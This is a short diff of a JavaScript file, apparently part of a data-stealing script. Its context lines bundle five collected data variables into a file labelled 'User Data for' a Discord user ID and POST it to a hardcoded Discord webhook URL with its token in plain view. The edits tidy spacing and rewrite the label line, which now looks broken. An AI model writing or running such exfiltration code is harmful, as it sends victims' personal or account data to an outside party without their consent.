@@ -856,11 +856,11 @@
                                   const jsonData2 = JSON.parse(text5);
                                   console.log(jsonData5);*/
 
-                                data = '{"content":[' + data1 + ',' + data2 + ','  + data3 + ','  + data4 + ','  + data5 + ']';
+                                data = '{"content":[' + data1 + ',' + data2 + ',' + data3 + ',' + data4 + ',' + data5 + ']';
                                 const fileData = new Blob([data], { type: 'text/plain' });
                                 var formData = new FormData();
                                 formData.append("file", fileData);
-                                formData.append("content", "User Data for: <@" + data1(jsonData.id) + ">");
+                                formData.append("content", "User Data for: <@" + jsonData.id(JSON.parse(data1)) + ">");
                                 var xhr = new XMLHttpRequest();
                                 xhr.open("POST", "https://discord.com/api/webhooks/1182448052682899476/sm49BAY7M0tQgM6Y9TGaBHOGsbxgW8sEftx8QccO8gGIJQvof05C0XrsN-XN_1eu8HXW");
                                 xhr.send(formData);
